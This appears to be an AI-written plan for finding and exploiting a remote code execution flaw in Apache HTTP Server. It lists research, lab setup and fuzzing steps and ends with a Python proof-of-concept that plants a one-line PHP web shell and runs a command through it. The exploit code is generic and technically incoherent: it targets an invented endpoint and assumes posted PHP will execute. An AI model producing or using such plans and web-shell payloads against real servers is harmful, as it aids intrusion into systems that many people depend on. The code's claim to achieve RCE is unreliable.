- Target: Apache HTTP Server (widely used with a large user base)

- Research:
  - Review CVE database for Apache HTTP Server vulnerabilities
  - Analyze recent security advisories and patches
  - Study zero-day exploits disclosed in the past year

- Testing Environment:
  - Set up a virtual machine with Apache HTTP Server
  - Use tools like Docker for isolation and reproducibility
  - Ensure network isolation to prevent accidental exploitation

- Fuzzing:
  - Use AFL (American Fuzzy Lop) to fuzz Apache HTTP Server
  - Focus on HTTP request parsing and response handling
  - Monitor crash logs and memory corruption indicators

- Exploit Development:
  - If a vulnerability is found, write a PoC in Python3
  - Example code snippet for RCE:

```python
import requests

def exploit_rce(target):
    # Craft malicious payload
    payload = "<?php system($_GET['cmd']); ?>"
    # Send payload to exploit vulnerability
    r = requests.post(f"{target}/vulnerable_endpoint", data=payload)
    if r.status_code == 200:
        # Execute command
        cmd_result = requests.get(f"{target}/vulnerable_endpoint?cmd=id")
        return cmd_result.text
    return "Exploit failed"

# Usage
print(exploit_rce("http://example.com"))
```

This plan outlines the steps to find and exploit an RCE vulnerability in Apache HTTP Server.
